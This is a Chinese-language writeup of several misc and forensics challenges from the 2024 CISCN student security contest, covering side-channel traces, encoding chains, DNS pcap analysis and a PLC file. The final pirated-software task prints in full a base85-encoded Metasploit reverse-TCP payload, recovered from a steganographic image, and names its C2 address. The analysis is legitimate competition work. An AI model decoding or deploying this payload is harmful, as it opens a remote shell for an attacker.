---
title: '2024 第十七届 CISCN 全国大学生信安赛 Writeup'
description: '配置 MetaMask 后集齐 7 种食材，兑换NFT即可拿到 flag'
pubDate: 2024-05-19
author: 'IHK-1'
tags: ['CTF', 'CISCN', '2024']
---

# MISC
## 火锅观光链打卡
配置 MetaMask 后集齐 7 种食材，兑换NFT即可拿到 flag

<!-- 这是一张图片，ocr 内容为：火锅游戏 欢迎来到火锅游戏,您可以在这里通过游戏收集食材,兑换专属NFT! 连接钱包 领取空投 兑换NFT 您已连接到钱包,地址为:0X8308FE314773F81AA2A5B15FCEEF48457BF3D152 您的余额为:0ETH 游戏规则 每次正确答题会获得任意一个火锅食材图片. 当收集任意7个不同食材图片,即可点击上方的兑换NFT进行申请. 快来点击下方按钮开始游戏,加入我们的火锅链吧! 获取提示 ,发送关键词"链上火锅",即可获取更多提示信息哦~ 关注微信公众号春秋伽玛 开始游戏 -->


<!-- 这是一张图片，ocr 内容为：FLAG{YOU_AR3_HOTPOT_KING] INFT! 8457BF3D152 更多提示信息哦~ HOTPOTKING-12 ID:100599 0X8308FE314773F81AA2A5B15FCEEF48457BF3D152 -->


## Power Trajectory Diagram
查看数据

```python
import numpy as np
import matplotlib.pyplot as plt

data = np.load(r"C:\Users\HK\Desktop\attachment.npz")
plt.imshow(data['trace'])

plt.savefig('depthmap.jpg')
plt.show()
```

<!-- 这是一张图片，ocr 内容为：0 500 0 1000 2000 3000 4000 -->


发现载入 npz 后，发现 input 字符为520个，流也有 520 个，相当于爆破每一个字符

读取每一支流，当一段区间字符读取到时读取下一个区间

```python
import matplotlib.pyplot as plt
import numpy as np

data = np.load(r"C:\Users\HK\Desktop\attachment.npz")
index = data['index']  # 520
input = data['input']  # 520
trace = data['trace'] * 1024


password = '' 
tmp = 0 # 初始区间
for i in range(len(trace)): # 尝试每个流
    data = trace[i]
    for j in range(len(data)):
        if data[j] < -250: # 当正确时会输出 波谷会下降 -170 ~ -512 一段时间，该流的字符为正确字符

            if j > tmp:
                password += input[i]
                tmp = j # 进入下一个区间
            break

print(password)
# a_ciscn_2024a
```

```plain
对照 载入数据的 值进行修改，第一个字符没有完全延时，正确长度为12，即 _ciscn_2024a，最后一个流需要手动尝试尝试的得到 _ciscn_2024a_
```

## 神秘文件
```plain
1./docProps/app.xml
  Bifid cipher
  QFCfpPQ6ZymuM3gq
  lanjing
  > Bifid:UGFydDE6ZmxhZ3tl
  > base64: Part1:flag{e
  
2./ppt/embeddings/Microsoft_Word_Document.docx
  mQPinNS6Xtm1JGJs
  offset:10
  > ROT 10: cGFydDI6Njc1ZWZi
  > base64: part2:675efb

3.olevba
  i13POMdzEAzHfy4dGS+vUA==
  > RC4: PArt3:3-34

4.PPT3
  UGF5dDQ6NmYtNDA==
  > base64: Payt4:6f-40

5./ppt/notesSlides
  Vm1wR1UxRXhXWGhUV0d4WFlrZG9WMWxVUm1GWFJscHlWMjVrVmxKc2NIaFZiVFZQVkd4S2MxSnFVbGRXTTFKUVdWVmtVMDVyTVVWaGVqQTk=
  > base64: pArt5:5f-90d

6./ppt/media
  UGFyVDY6ZC0y
  > base64: ParT6:d-2

7./ppt/slides/slide4.xml
  HRSFIQp9ZwWvZj==
  ROT13
  > ROT13: UEFSVDc9MjJiMw==
  > base64: PART7=22b3
  
8.ppt/slideLayouts/slideLayout2.xml
  c1GFSbd3Dg6BODbdl
  > remove-all: cGFSdDg6ODdl
  > base64: paRt8:87e

9.ppt\media\image57.jpg
  cGFyVDk6ZGVl
  > base64: parT9:dee

10./ppt/comments/comment1.xml
  ZYWJbIYnFhq9
  furry
  > Vigenere: ZYWJbIYnFhq9
  > base64: PARt10:9}

> flag{e675efb3-346f-405f-90dd-222b387edee9}
```

## Tough_DNS
dns.qry.name && frame.len == 145

```plain
tshark.exe -r Tough_DNS.pcapng -T fields -e dns.qry.name -Y 'frame.len == 145' > out.txt
```

<!-- 这是一张图片，ocr 内容为：十 OUT.TXT 查看 编辑 文件 111111101100101111111.BAIDU.COM 100000100100101000001.BAIDU.COM 1011101010101010101101.BAIDU.COM 101110101001001011101.BAIDU.COM 101110101110001011101.BAIDU.COM 100000100000001000001.BAIDU.COM 111111101010101011111.BAIDU.COM 000000000110000000000.BAIDU.COM 111100101010010011101.BAIDU.COM 010010000010110111111.BAIDU.COM 011001111000101100001.BAIDU.COM 001110000110100001000.BAIDU.COM 000101111001001100000.BAIDU.COM 000000001111001110010.BAIDU.COM 111111100100011010110.BAIDU.COM 100000100011010000100.BAIDU.COM 101110100001000010110.BAIDU.COM 101110101110110100110.BAIDU.COM 1011101010101110101100.BAIDU.COM 100000101110001111001.BAIDU.COM 1111111011110011111100.BAIDU.COM -->


<!-- 这是一张图片，ocr 内容为： -->


```plain
15f9792dba5c
```

dns.txt && dns.id == 0x4500 拿到压缩包，并使用 15f9792dba5c 解压得到 secret.pgp

```plain
tshark.exe -r Tough_DNS.pcapng -T fields -e dns.txt -Y 'dns.id == 0x4500' > out.txt
```

dns.txt && dns.id == 0x6421 

```plain
tshark.exe -r Tough_DNS.pcapng -T fields -e dns.txt -Y 'dns.id == 0x6421' > out.txt
```

题目描述：

```plain
56 16 26 93 66 53 16 56 d2 03 26 93 56
> reverse: 65 39 62 30 2d 65 61 35 66 39 62 61 65
> from hex: e9b0-ea5f9bae
> reverse: eab9f5ae-0b9e
```

--import 导入 secret.gpg，输入密码后 --decrypt 6421 流的密文，即可拿到 flag

<!-- 这是一张图片，ocr 内容为：( ROOTS KALI GPG --IMPORT /ROOT/DESKTOP/SECRET.GPG "CTFER (NONE) <CTFER@GMAIL.COM>" NOT CHANGED GPG: KEY CD34F6C587E55290: "CTFE GPG: KEY CD34F6C587E55290: SECRET KEY IMPORTED GPG: TOTAL NUMBER PROCESSED:1 OME,THE MORE YOU ARE ABIE TO HEA UNCHANGED:1 GPG:  SECRET KEYS READ: 1 GPG:  SECRET KEYS UNCHANGED: 1 GPG: (ROOTSKALI)-[~] GPG --DECRYPT '/ROOT/DESKTOP/SECRET.ASC' A KEY, ID 51457644D5D8B1B5, CREATED 2023-05-29 WITH 1024-BIT RSA KEY, GPG:ENCRYPTED CTFER <CTFER@GMAIL.COM> NONE FLAG{79830A47-FAF7 9-4067-B585-145776F833CD} -->


## 通风机
搜索得知为 西门子 PLC 文件，安装 STEP7-Micro 即可

创建一个 mwp 文件

<!-- 这是一张图片，ocr 内容为：STEP 7-MICRO/WIN-PROJECT1 FILE EDIT VIEW PLC DEBUG HELP WINDOWS TOOLS 6 学静 报艺艺 双脑 PROJECTI VIEW SIMATIC LAD WHAT'S NEW CPU 221 REL 01.10 5111666117 由PROGRAM BLOCK VAR TYPE COMMENT DATA TYPE SYMBOL 由-SYMBOL TABLE PROGRAM BLOCK TEMP @STATUS CHAIT TEMP 由DATA BLOCK TEMP 电 TEMP SYMBOL TABLE CROSS RETERENCE 由 COMMURICATIONS 另存为 PROGRAM COMMENTS 由 STATUS CHART NETWORK 1 NETWORK TITLE 桌面 白山 T 保存在(): NETWORK COMMENT FAVORITES BIT LOGIC 园 网 CLOCK DATA BLOCK 由由-由-由 图库 SYSTEM BLOCK ONEDRIVE NETWORK  2 安BEFLOATINGPOINT MATH 面 四申 由由由由由- 网 视频 LOGICAL OPERALIONS CROSS REFERENCE A PROGRAM CONTIOL SHITT/ROTATE PROJECT1 文件名(): 保存(S) STING COMMUNICATIONS NETWORK 3 OBLE PROJECT FILE(*.MWP) 保存类型(): 取消 A IMERS LIBRANES 田 ON CALL SUBROUTINES SET PG/PC MAIN 人 SBR.0 人 INT_0/ TOOLS INS READY NETWORK 1 ROW 1.COL 1 -->


<!-- 这是一张图片，ocr 内容为：PROJECT1MWPX 起始页 1通风机监控.MWP LOADER.EXE VULN.WASM WASM OUT OUT 3 4 5 6 7 B C D E F 0123456789ABCDEF 0000H 4B105230342E30300000000000000 47 4A 4B DO GJK.R04.00. 000010H 00000000000000000000000000000000000000000000 00 00 00 00 AA AA 00 00 AA AA 00 AA AA AA 00 00 0020H .AA AA  AA 0030H AA AA 00 00 3A 1B 00 00 78 9C ED 58 BD 6F D3 40 XEIX%O0@ 10040H 14 7F 77 76 E2 B4 85 36 B4 A5 40 19 B8 05 90 40 .6"￥@....回 .WVA. ..MO`.OR.O.B 0050H 84 A4 2A 03 13 4D D3 B4 2A 90 C4 72 12 12 42 10060H 10 A8 0B 85 B6 A9 D2 FO 25 81 88 C4 82 D8 59 10 1000%.  A,0Y -->


对比 吹风机文件 需要修补 GJK 入文件头，修复后运行

<!-- 这是一张图片，ocr 内容为：STEP 7-MICRO/WIN-1通风机监控 FILE EDIT VIEW PLC DEBUG TOOLS WINDOWS HELP 陶胸 2421 V 5 梦想亮 SYMBOL TABLE WHAL'S NEW CPU 224XP CN REL 02.01 PROGIAM BLOCK SYMBOL COMMENT SYMBOL TABLE PROGLAM BLOCK 俩个及三个灯显示标志 M0.0 日用户定义1 POU符号 23 一个灯显示标志位 M0.1 电 STABUE CHART 指示灯 Q0.3 SYMBOL TABLE 音池00.5 DATA BLOCK 4 ZMWHZ3SYNDY3Y2UYNILMZMY5LTQWMDGROGQ1NSOUN2R 园 SYSTEN BLOCK MODNY2JMYZJ9 CROSS RELERENCE 5 COMMUNICABIONS 67 STATUS CHART 由- WIZANDS TOOLS 8 日-M INS INSTRUCTIONS -FAVORITES DATA BLOCK 由.BITLOGIC 电 9- 由由由由 COMMUNICATIONS COMPARE SYSTEM BLOCK CONVERT 因因因由由由由由 COUNTERS FLOATINGPOINT MATH INTEGER MATH CROSS REFERENCE 血 OGICAL OPELETIONS MOVE PROGRAM CONTROL COMMURICATIONS @SHIT/ROTALE 电 AS) STRING 申 TABLE (O T I MERS SET PG/PC INTERFACE LIBRARIES CALL SUBROUTINES -->


在用户自定义中存在 flag

```plain
ZmxhZ3syNDY3Y2UyNi1mZmY5LTQwMDgtOGQ1NS0xN2RmODNlY2JmYzJ9
> base64: flag{2467ce26-fff9-4008-8d55-17df83ecbfc2}
```

## 盗版软件
3842.dmp 文件：

<!-- 这是一张图片，ocr 内容为：R-STUDIO TECHNICIAN 9.3.191230-文件视图 驱动器(D)文件(F)工具(M)帮助(H)帮助(H) HACKEXE.EXE 属性 STOP 查找下一个(N) 重新护 文件掩码(M) 上(U) 预览(P) 选项(0) (P) 停止(S) 常规 兼容性安全 详细信息以前的版本 已访问 已创建 名称 坊 已修改 大小,字节 HACKEXE,EXE 2024/2/1...  2024/2/1 2024/2/1.... SS 282 2024/2/1...  2024/2/1... 2024/2/1... DESKTOP.INI 2024 111 720 776 20241 202A/1 DIEHE SETUN 3.0 1735 EVE 应用程序(EXE) 文件类型: 2.593.792  2024/2/1...  2024/2/1...   2 2024/2/1... PROCEXE.EXE 描述: HACKEXE.EXE 位置: C:\USERS\HK|DESKTOP 大小: 2.47MB(2,593,792字节) 2.47MB(2.596,864字节) 占用空间: 创建时间: 2024年2月19日, 20:03:48 修改时间: 2024年2月19日,20:03:48 也] 访问时间: 2024年5月19日,15:18:52 属性: O只读(R)(H) 高级(D)... 大图标 器小图标 品 中图标 排序 详细信息 X 日志 文本 文文文文化 解析的分配大小(8388608)不同于所存佳的(67108864) .但应该是0X4A 0,但应该是0X4A 取消 应用(A) 确定 解析的分配大小(2891776)不同于所存储的(23134208) RUE ENUMCRAUEN WAS VOMPLETED IN 15. HECLEL 系统 ALL FILE REGIONS ARE COLLECTED. 15:19:54 2024/5/19 准备 已标记:0文件和0文件夹.总大小为:0BYTES 3847文件夹中16217文件总计的6.20GB -->


用户在 /ctf/download  目录中下载了 prcocexe.exe 文件对比可知为 hacexe.exe 文件

```plain
AXIOM 中分析历史记录，用户在 winhack.com 下载盗版文件: 
http://winhack.com/ProcessKO 6.31 中文绿色版免费下载(进程管理工具)-哇哦菌
```

<!-- 这是一张图片，ocr 内容为：MAGNET AXOM EXAMINE V7.80.38310-A00M -MAY 19 2024 095855 文件(&白工具进程 HIB(8(8(8(810 证据 日期和时间 配置文件 部分结果 内容类型 使用真迹 关键字列表 过滤器 清除过浓器 四配结果(第106个,共2,834个) 标签,备注和配置文件 HTTP://WINHACK.COM/PROCESSKO%... 列视图 使用后迹 用户.. URL 类型 位置 匹配结果 6.782 3842.RAW 已伦斑 HTTP://WINHACK.COM/PROCESSKO 治在改革活动 3842 REW LSK0%206.31%20%E4%B8... FILE OFFSET 181965 3842.ISW 2 精炼信息 HTTPU/WINHACK.COM/PROO 落在浏览器活动3842.ROW 已挖拉 K06.31%205.31%20%B8... 详情 滑在浏览活动3842.10W 已挖泽 HTTP//WINHACK.COM/PROCESSK0%206.31%20%E4%88... FILE OFAET 241131... 社交媒体URL 已抢送 HTTP://WINHACKCOM//PROCESSKO 治在创览最活动3842.TAW FILE OFFOET 105013... SSK0%206.31%20%E4%B8... 106 WEB 相关 HTTPU/WINHACK.COM/PROCESSKT 潜在浏览服活动 38420W 已挖择 HLLP//WINHACK.COM/PROCESSK0%206.31%20%E4%B8%AD% 滑在放货客活动 106 治在浏览器活动3842REW已挖掘 HTTPS//WINHACKCOM/PROCESSKO%206.31%20%60%888.. FILE OFISET 105014 66%96%87%E7%88%81%E8%89%82%E7%89%88%E5%85%8D S18584%59%14%8888%(6ABD%BD%(6%01%90%(7% 洁在创览管活动 3842.28W 已抢据 HTTP://WINHACK.COM/PROCESSKO FILE OFSET 239653... 操作系统 6.674 A8%88%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7)-% FLE OFFSET 105018... 潜在浏范修活动3842.3842.日挖尾 HTTP://WINHACK.COM/PROCESSIC 65K0%206.31%20%664%B8... FILE OFFSET 246073.. 潜在浏览器活动3842.18W 已起闭 HTTP://WINHACK.COM/ SK0%206.31%20%E4%B8... 发型 FILE OFFSET 120516.. 已抢狂 治在浏览最活动 3842REW HTLPS FHWASE BEIDUCOM/SUGRECTPREN 1BKP 38IEN UTF-.... 项目ID FILE OFFSET 216848... 3842RAW 已挖掘 潜在浏览器活动3842.00W HTTPU/TIEBA.BAIDU.COM/F?FR:WWWT&IE UTF-88DYTABS... 证号信息 FILE OFFSET 176391 已挖择 酒在浏览器活动3842/EW BESSKO%206.31%20%E4%88.3 3842.REW HTTP://WINHECKCOMAPROCEA 潜在创览策活动3842.RAW已挖莲 HTTPU/WINHACKCOM/PREESSK0%206.31%20%E4%B8... FILE OFFEET 234708... 3842 RAN 3842.1AW TOM/PROSS:(CO%206.31%20%64%88... 已挖钱 HTTP://WINHACK.COM 3842.MAW 潜在浏览器活动3842.RAW 恢复方法 已钱坏 潜在浏览器活动3842.10W FILE OFISET 242215... HTTP://WINHACK.COM/PROCESSKO%206.31%20%6666668 3842 RAW 已到冷源 已抢您 潜在制览最活动 3B42.RAW HTTPS://WWW.BAIDU.COM/SUGRECTPREN IBJENUTF-... 3042.RA FILE OFOET 216779 位藏 已友善已友送 潜在浏览器活动 3842.COW FLLE OFFOET 192814... 3842.RAW HTTPU/WINHACK.COM/PROCESSKO%206.31%20%E4%88. 证据编号 满在浏览器活动 3842.639  已法国 HTTP://WINHACK.COMPROTESSKO FILE OFFET 234774 ESSK0%206.31%20%66%B8., 洁在浏览带活动 3842.09  已挖摇 HTTP://WINHACK.COM/PROCESS BCESS100%206.31%20%E4%BBB... FILE OFFSET 234775... HTTPU//VINHACK.COM/PROCESSK0%206.31%20%E4%88... FILE OFFOCT 234777... 潜在浏览器活动3842.0W  已挖援 HTTPU/AAIRHACKCOMYPROCESS 已挖择 FILE OFSET 23477 满在放码最活动384218W 3812RAW 6.31%206.31%20%64%88... 已抢您 HTTP://WINHACK.COM/PROCESSK 洁在到魔装活动3842.RAW FILE OFFSET 246069... 3042.RAW FILE OFFOET 246070_ 已挖掘 HTTP://WINHACK.COM/PROC 潜在浏汽装活动3842.CAW 3842.RAW 已接接 滑在浏览器活动3842.RAW FILE OFFSET 18660 VISUGRECTPREELAPE3810MUTF-N 3842 RAW HTTPS://WWW.BAIDU.COM.SUG 已抢运 HTTP://WINHACK.COM/PROCESSKO 洁在创览装活动3842.CAW FLE OFSET 234777.. 066580056206.31%203664%688 3842 RAW FILE OFFOCT 234778... HTTPU/WINHACK.COM/PROCE SSKO%206.31%20%64%B8... 已挖掘 3842.RAW 潜在浏览修活动3842JAW 潜在浏览器活动 384240W 已挖择 FILE OFFSET 105019... SKO%206.31%20%6456888 HTTP://WINHACK.COM/P 3842.RAW 已抢赔 治在浏览带活动 FILE OFFSET 115179... 3842.ROW HTTPS//WWW.BAIDU.COM/STIE UTF-88F 3&ERSV BP.1& 已挖尾 SKO%206.31%20%64%88... 潜在浏览器活动3842409 已格福 HTTP://WINHACKCOM/PROD SK0%206.31%20%64%B8.. 已秒保 HTTNC//WINHART.COM/PRONESS 洁有别落器传动  14708 时区 UTC-000 -->


```plain
获得域名: winhack.com
```

hackexe.exe:

运行文件文件释放 output.png 与 loader.exe

output 存在 LSB 隐写，将 R 通道勾选后生成 ，发现 zip 头文件，但是相隔一个字符

```python
import struct

data = open(r"C:\Users\HK\Desktop\out",'rb').read()
out1 = b''
out2 = b''

for i in range(0, len(data), 2):
    out1 += struct.pack('B', data[i])
    out2 += struct.pack('B', data[i + 1])

with open(r"C:\Users\HK\Desktop\out1", 'wb') as f:
    f.write(out1)

with open(r"C:\Users\HK\Desktop\out2", 'wb') as f:
    f.write(out2)
```

分离出压缩包后包含 .b 文件

```plain
r()J$nEA'r!!#;^5u:HM1"'W(Mc*q[<_/-H(eBQ_+@m$P8kMf4a[h>1:e3=VX?9p=!\>H[_9!-P!Q!d_;F+/NMc([U69Id>ct7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb"[QMa/CV!RTk-8H6e+1!)_>1l+['ejqO2X?j\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j"Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\Sls57!F=^"@S''W'hs8Q@r^3=WR?SaG;!'sXWM<7?[m%=@Z!(i%/8\>*)+T!Ns8F&Q@8VuM%M=EmC9Qqfgs4'f"l=^2!!!$.f\g`/F!<:Sa$:.up:e`[d9ejFSs1h0^_FX^B8;Y/K]'9g`i;_=uM8s?B6!-g;i^eq%6+WJ\FCG4"Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC'6h)8;[..\cUR+?iSZ/p],bC8;"i'?A\Aj5XAOd!"],16!-[7njkLW6+U0o;s"&08;Y5UM8r=Fa[q?Y8;Z%kM>9HK!nkY%s4)bs!.?7t6!%3&!'gMa6!.k%>!]_-0+Tc:eQ5m>\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\
```

进行 base85 解码，发现在传输时会被判定 为病毒

<!-- 这是一张图片，ocr 内容为：BASE85.DATA(511.00B) 继续发送取消 -->


放入安恒云沙箱运行，判定病毒

<!-- 这是一张图片，ocr 内容为：登录 安恒云沙箱 文件分析 搜索 立即注册 最近分析 回分析台 10CT 站行为图 行为分析 圆静态提取 ATT&CK 民处吉建议 @威胁检出 BASE85.DATA 主新分析 图文件类型T 高危 黑客工具 文件大小511.00B 早图平台 METASPLOIT 日PCAP下载 目平面报告 样本下载 行为风险 流呈检测 恶意配置 漏洞利用 AI动态检测 威胁情报 静态检测 87010BD57CF07BEC39F06901E9D3FC37 MD5 黑客工具 COR... CBFE4D6CCE5B1A9D445C0BF1872C5712CC6 SHA1 89CE9 黑客工具 ME... 未检出 未检出 未检出 SHA256 未检出 未检出 A97946C34D2D8642820F196A54A6E8D78CF 黑客工具 ME... 4F58A97E417BE9696D7FD19E7IC95 WINDOWS 7 64BIT 运行环境 扫描时间 2024-05-19 14:57:13 田微报告 运行时长 60S 四川中电子 分析配置 80 通过安恒云沙箱分析,该样本研判结果为高危. 样本文件名为"BASE85.DATA",MD5为87010BD57CF07BEC39F06901E9D3FE37,是以类型的文件. 运行截图 该样本被静态检测,恶意配置引擎检测出. 样本被检测为METASPLOIT黑畜工具. "MELASPLOIL黑各工具;MELASPLOIT是一款开源的渗透测试框架,功能强大,已被多个不同的攻击行动中. 展开更多 场景信息 网络方问 -->


<!-- 这是一张图片，ocr 内容为：安恒云沙箱 登录 搜索 最近分析 文件分析 立即注册 ATT&CK 图10C1 令行为分析 回分析台 静态提取 出行为图 民处置建议 威胁检出 [4] HTTPS//HEDFIRREPORTCOM/2023/04/04/03/MALICIOUS-ISO-FILE-LEADS-TO-DOMAIN-WIDE-RANSORNWARE/ 王新分析 文件类型TXT 高危 文件大小511.00B 星图平台 静态检测 田PCAP下载 6 样本下载 目平面报告 文件名 MD5 TAGS MD5 87010BD57CF07BEC39F06901E9D3FC37 SHA1 CBFE4D6CCE5B1A9D445C0BF1872C5712CC6 87010BD57CF07BEC39F06901E9D3FC37 BASE85.DATA 黑本工具 黑香工具 89CE9 SHA256 A97946C34D2D8642820F196A54A6E8D78CF 日恶意配置 4F58A97E417BE9696D7FD19E7FC95 WINDOWS 7 64BIT 运行环境 87010BD57CF07BEC39106901E9D3FC37 MDS 黑各工只 BASE85.DATA METASPLOIT 扫描时间 2024-05-19 14:57:13 中 VERSION 军客工具 WINDOWS/X64  REVERSE TCP 运行时长 605 CONNECT PORT 8443 四单 母 0O 80 分析配置 METASPLOIT FARMILY 39.100.72.235 CONNECT IP 运行教图 国威胁情报 田行为风险 涌润利用 /AI动态检测 流量检测 -->


```plain
获得C2地址: 39.100.72.235
```

```plain
得到flag: 
> flag{md5(winhack.com39.100.72.235)}
> flag{096e8b0f9daf10869f013c1b7efda3fd}
```



